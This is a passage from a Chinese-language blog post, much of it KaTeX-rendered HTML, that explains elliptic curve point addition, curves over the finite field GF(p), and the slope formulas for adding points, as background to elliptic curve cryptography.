style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord">/</span><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">2</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord">/</span><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/a2f53d2a42888e0e.png" alt="" /></p>
<h2 id="椭圆曲线的加法运算"><a class="anchor" href="#椭圆曲线的加法运算">#</a> 椭圆曲线的加法运算</h2>
<p>定义：如果其上的 3 个点位于同一直线上，那么它们的和为 O</p>
<ol>
<li>O 为加法单位元，对椭圆曲线上任一点 P，都存在 P+O=P</li>
<li>设 P1=(x,y) 是椭圆曲线上一点，则加法逆元定义为 P2=-P1=(x,-y)</li>
<li>在 P 点做椭圆曲线的一条切线，设切线与椭圆曲线交于 S，定义 3P=P+P+P=2P+P</li>
</ol>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/2ad5274cf615e2e3.png" alt="" /></p>
<h2 id="有限域上的椭圆曲线"><a class="anchor" href="#有限域上的椭圆曲线">#</a> 有限域上的椭圆曲线</h2>
<p>椭圆曲线是定义在实数域上的，实数是连续的，进而导致了曲线的连续。因此，把椭圆曲线变成离散的点，我们要把椭圆曲线定义在有限域上，这样才能用于加密。</p>
<p><em><strong>关于有限域的定义请看我的这一篇<a href="https://kyrita.top/number/math/%E6%9C%89%E9%99%90%E5%9F%9F-md/">博客</a></strong></em></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>∈</mo><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mspace width="1em"/><mn>4</mn><msup><mi>a</mi><mn>3</mn></msup><mo>+</mo><mn>27</mn><msup><mi>b</mi><mn>2</mn></msup><mo mathvariant="normal">≠</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y^2=x^3+ax+b(a,b\in GF(p),\quad4a^3+27b^2\neq0)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord">7</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>E</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mtext>上的加法定义如下</mtext><mo>:</mo><mtext>设</mtext><mi>P</mi><mo separator="true">,</mo><mi>Q</mi><mo>∈</mo><msub><mi>E</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E_p(a,b)上的加法定义如下:设P,Q\in E_p(a,b)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">义</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">下</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">设</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span></span></p>
<ol>
<li>
<p>若 P=O，则 P+Q=Q；否则若 Q=O，P+Q=P</p>
</li>
<li>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>若</mtext><msub><mi>x</mi><mn>1</mn></msub><mo>=</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mtext>且</mtext><msub><mi>y</mi><mn>1</mn></msub><mo>=</mo><mo>−</mo><msub><mi>y</mi><mn>2</mn></msub><mo separator="true">,</mo><mtext>则</mtext><mi>P</mi><mo>+</mo><mi>Q</mi><mo>=</mo><mi>O</mi></mrow><annotation encoding="application/x-tex">若x_1=x_2,且y_1=-y_2,则P+Q=O
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">若</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">且</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></span></p>
</li>
<li>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>记</mtext><mspace width="1em"/><mi>λ</mi><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mfrac><mrow><msub><mi>y</mi><mn>2</mn></msub><mo>−</mo><msub><mi>y</mi><mn>1</mn></msub></mrow><mrow><msub><mi>x</mi><mn>2</mn></msub><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub></mrow></mfrac><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>P</mi><mo mathvariant="normal">≠</mo><mi>Q</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mfrac><mrow><mn>3</mn><msubsup><mi>x</mi><mn>1</mn><mn>2</mn></msubsup><mo>+</mo><mi>a</mi></mrow><mrow><mn>2</mn><msub><mi>y</mi><mn>1</mn></msub></mrow></mfrac><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>P</mi><mo>=</mo><mi>Q</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">记\quad \lambda=\begin{cases} \frac {y_2-y_1}{x_2-x_1}, &amp; P \neq Q \\ \frac {3x_1^2
+a}{2y_1}, &amp; P = Q \end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord cjk_fallback">记</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">λ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0683279999999997em;vertical-align:-1.2841639999999996em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.784164em;"><span style="top:-3.910284em;"><span class="pstrut" style="height:3.13412em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.854439em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span></span></span><span style="top:-2.331064em;"><span class="pstrut" style="height:3.13412em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1341199999999998em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5102em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.214em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2841639999999996em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.784164em;"><span style="top:-3.910284em;"><span class="pstrut" style="height:3.13412em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">Q</span></span></span><span style="top:-2.331064em;"><span class="pstrut" style="height:3.13412em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2841639999999996em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
</li>
</ol>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>x</mi><mn>3</mn></msub><mo>=</mo><msup><mi>λ</mi><mn>2</mn></msup><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mspace width="1em"/><msub><mi>y</mi><mn>3</mn></msub><mo>=</mo><mi>λ</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo>−</mo><msub><mi>x</mi><mn>3</mn></msub><mo stretchy="false">)</mo><mo>−</mo><msub><mi>y</mi><mn>1</mn></msub><mspace width="1em"/><mo>−</mo><mo>−</mo><mo>−</mo><mo>&gt;</mo><mspace width="1em"/><mi>P</mi><mo>+</mo><mi>Q</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x_3=\lambda^2-x_1-x_2, \quad y_3=\lambda(x_1-x_3)-y_1 \quad ---&gt; \quad P+Q=(x_3,y_3)
